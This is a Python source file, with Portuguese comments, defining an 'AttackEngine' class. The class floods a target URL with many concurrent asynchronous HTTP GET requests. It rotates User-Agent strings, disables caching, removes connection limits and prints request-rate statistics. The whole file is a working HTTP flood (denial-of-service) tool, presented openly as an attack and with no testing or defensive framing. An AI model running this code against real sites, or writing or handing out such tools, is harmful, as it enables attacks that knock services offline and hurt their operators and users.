import asyncio
import aiohttp
import random
import time

class AttackEngine:
    def __init__(self, target_url, concurrent_requests, user_agents):
        self.target_url = target_url
        self.concurrent_requests = concurrent_requests
        self.user_agents = user_agents
        self.stats = {'success': 0, 'error': 0}
        self.running = False

    async def send_request(self, session):
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache"
        }
        try:
            async with session.get(self.target_url, headers=headers, timeout=5) as response:
                self.stats['success'] += 1
        except Exception:
            self.stats['error'] += 1

    async def worker(self, session):
        while self.running:
            await self.send_request(session)
            await asyncio.sleep(0.01)

    async def start(self):
        self.running = True
        connector = aiohttp.TCPConnector(limit=None, ttl_dns_cache=300)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(self.concurrent_requests):
                task = asyncio.create_task(self.worker(session))
                tasks.append(task)
            
            print(f"[*] Engine iniciada contra {self.target_url}")
            
            # Loop de monitoramento de status
            while self.running:
                await asyncio.sleep(2)
                print(f"[+] Stats -> Sucesso: {self.stats['success']} | Erro: {self.stats['error']}")
                self.stats['success'] = 0 # Reset para medir PPS (Requests per second)

    def stop(self):
        self.running = False